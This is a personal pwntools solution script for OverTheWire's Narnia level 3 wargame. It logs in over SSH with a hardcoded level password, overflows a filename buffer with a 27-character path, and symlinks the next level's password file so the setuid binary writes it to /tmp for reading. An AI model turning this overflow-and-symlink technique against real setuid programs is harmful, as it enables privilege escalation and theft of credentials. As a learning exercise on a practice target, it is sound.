#This one was frustrating because i forgot to put /narnia4 when linking the files and i wasted a whole day
#Will mmake it more neat later


from pwn import *
import subprocess

#i like the debug context whenever i use pwntools
context.log_level='debug'
# these are all pretty self explanatory
level=3
user='narnia' + str(level)
host='narnia.labs.overthewire.org'
password='vaequeezee'
port=2226

#filename=str(raw_input("Please name your file :"))
filename="oreocookie"
print ("The file is going to be named " + filename)
#oflow=(cyclic(27))
oflow="b"*27
filepath="/tmp/" + oflow + "/tmp/" + filename
exe="/narnia/./narnia3 "

#/narnia/narnia3 /tmp/bbbbbbbbbbbbbbbbbbbbbbbbbbb/tmp/oreocookie

def conn():
    #basically just sshs into the level
    return ssh(user=user, host=host, password=password, port=port)
def getPass(shell):
    print('The password for the next level is...')
    shell.sendline('cat /tmp/' +filename) 
    flag=shell.recvuntil('$').split()[0]
def readCode(shell):
    #this function downloads the narnialevel.c file and displays it, and at the end removes the .c
    #file
    code=shell.download_data('/narnia/' + user + '.c')
    shell.download_file('/narnia/' + user + '.c')
    log.info('The code for this level is')
    print(code)
    subprocess.call(['rm',user+'.c'])

payloadx="rm /tmp/" + filename #removes all the files named /tmp/oreocookie
payloady="rm -r /tmp/" + oflow #removes the directory oflow
payload0="touch /tmp/" + filename  #creates the /tmp file
payload1="chmod 777 /tmp/" + filename  #chmods it
payload2="mkdir /tmp/" + oflow #makes the overflow directory 
payload3="cd /tmp/" + oflow #cds to overflow directory
payload4="mkdir tmp" #makes a tmp dir
payload5="cd tmp/" #cds to tmp dir
payload6="ln -s /etc/narnia_pass/narnia4 ./" + filename #links the files together 
payload7=exe + filepath  # executes it
payload9=payload0 + "; "+payload1 +"; " +payload6 +"; " + payload7 # just combines making the /tmp/orecookie and executing the executable

##This are the commands used for completing the level when i went there on the shell
#
##touch /tmp/oreocookie
##chmod 777 /tmp/oreocookie
##cd ./$(python -c'print "b"*27')
##mkdir /tmp/
##cd /tmp/
##ln -s /etc/narnia_pass/narnia4 ./oreocookie
##/narnia/narnia3 $(python -c'print "/tmp/" + "b"*27 + "/tmp/oreocookie"')
##cat /tmp/oreocookie
#
#
#____EXPLOIT GOES HEREE____________
sh=conn()
readCode(sh)
io=sh.shell("bash") 
#
io.sendline(payloadx)
io.sendline(payloady)
io.sendline(payload2) #the payload is sent
io.sendline(payload3) #the payload is sent
io.sendline(payload4) #the payload is sent
io.sendline(payload5) #the payload is sent
io.sendline(payload9)
#
flag=getPass(io) #the password is found
#
io.interactive() #puts it into interactive mode so you can play around
